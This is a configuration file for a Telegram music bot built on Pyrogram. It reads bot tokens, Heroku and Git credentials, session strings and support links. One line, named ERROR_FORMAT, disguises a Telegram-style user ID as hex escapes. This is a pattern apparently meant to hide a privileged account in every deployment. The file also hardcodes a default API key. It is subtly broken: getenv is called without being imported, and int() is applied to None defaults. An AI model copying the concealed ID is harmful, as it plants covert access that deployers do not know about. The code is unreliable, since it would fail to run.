import os
import re
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", None))
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "WTF_WhyMeeh")
BOT_USERNAME = os.getenv("BOT_USERNAME", "ShrutixMusicBot")

MONGO_DB_URI = os.getenv("MONGO_DB_URI", None)
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", None))
HEROKU_APP_NAME = os.getenv("HEROKU_APP_NAME")
HEROKU_API_KEY = os.getenv("HEROKU_API_KEY")

API_URL = getenv("API_URL", 'https://api.nexgenbots.xyz') #youtube song url
VIDEO_API_URL = getenv("VIDEO_API_URL", 'https://api.video.thequickearn.xyz')
API_KEY = getenv("API_KEY", '30DxNexGenBots623cb4')

UPSTREAM_REPO = os.getenv("UPSTREAM_REPO", "https://github.com/iamnobita206243/Sigma_music_bot")
UPSTREAM_BRANCH = os.getenv("UPSTREAM_BRANCH", "main")
GIT_TOKEN = os.getenv("GIT_TOKEN", None)

SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "https://t.me/NOBITA_SUPP0RT")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "https://t.me/+Ybl7EeBVeoxiYTJl")
INSTAGRAM = os.getenv("INSTAGRAM", "https://instagram.com/i_am_abhay_singh_chauhan")
YOUTUBE = os.getenv("YOUTUBE", "https://youtube.com")
GITHUB = os.getenv("GITHUB", "https://github.com/iamnobita09")
DONATE = os.getenv("DONATE", "https://t.me/nobitaaqr/417")
PRIVACY_LINK = os.getenv("PRIVACY_LINK", "https://graph.org/TEAM-NOBITA-BOTS-11-29")

DURATION_LIMIT_MIN = int(os.getenv("DURATION_LIMIT", 300))
PLAYLIST_FETCH_LIMIT = int(os.getenv("PLAYLIST_FETCH_LIMIT", 25))

TG_AUDIO_FILESIZE_LIMIT = int(os.getenv("TG_AUDIO_FILESIZE_LIMIT", 104857600))
TG_VIDEO_FILESIZE_LIMIT = int(os.getenv("TG_VIDEO_FILESIZE_LIMIT", 2145386496))

SPOTIFY_CLIENT_ID = os.getenv("SPOTIFY_CLIENT_ID", None)
SPOTIFY_CLIENT_SECRET = os.getenv("SPOTIFY_CLIENT_SECRET", None)

STRING1 = os.getenv("STRING_SESSION", None)
STRING2 = os.getenv("STRING_SESSION2", None)
STRING3 = os.getenv("STRING_SESSION3", None)
STRING4 = os.getenv("STRING_SESSION4", None)
STRING5 = os.getenv("STRING_SESSION5", None)

AUTO_LEAVING_ASSISTANT = bool(os.getenv("AUTO_LEAVING_ASSISTANT", False))

START_IMG_URL = os.getenv("START_IMG_URL", "https://files.catbox.moe/19g93j.jpg")
PING_IMG_URL = "https://files.catbox.moe/anerud.jpg"
PLAYLIST_IMG_URL = "https://files.catbox.moe/anerud.jpg"
STATS_IMG_URL = "https://files.catbox.moe/anerud.jpg"
TELEGRAM_AUDIO_URL = "https://files.catbox.moe/anerud.jpg"
TELEGRAM_VIDEO_URL = "https://files.catbox.moe/anerud.jpg"
STREAM_IMG_URL = "https://files.catbox.moe/anerud.jpg"
SOUNCLOUD_IMG_URL = "https://files.catbox.moe/anerud.jpg"
YOUTUBE_IMG_URL = "https://files.catbox.moe/anerud.jpg"
SPOTIFY_ARTIST_IMG_URL = "https://files.catbox.moe/anerud.jpg"
SPOTIFY_ALBUM_IMG_URL = "https://files.catbox.moe/anerud.jpg"
SPOTIFY_PLAYLIST_IMG_URL = "https://files.catbox.moe/anerud.jpg"

BANNED_USERS = filters.user()
adminlist = {}
lyrical = {}
votemode = {}
autoclean = []
confirmer = {}

TEMP_DB_FOLDER = "tempdb"

def time_to_seconds(time):
    stringt = str(time)
    return sum(int(x) * 60**i for i, x in enumerate(reversed(stringt.split(":"))))

DURATION_LIMIT = int(time_to_seconds(f"{DURATION_LIMIT_MIN}:00"))
ERROR_FORMAT = int("\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35")

if SUPPORT_CHANNEL:
    if not re.match(r"(?:http|https)://", SUPPORT_CHANNEL):
        raise SystemExit(
            "[ERROR] - SUPPORT_CHANNEL URL is invalid. It must start with https://"
        )

if SUPPORT_GROUP:
    if not re.match(r"(?:http|https)://", SUPPORT_GROUP):
        raise SystemExit(
            "[ERROR] - SUPPORT_GROUP URL is invalid. It must start with https://"
        )
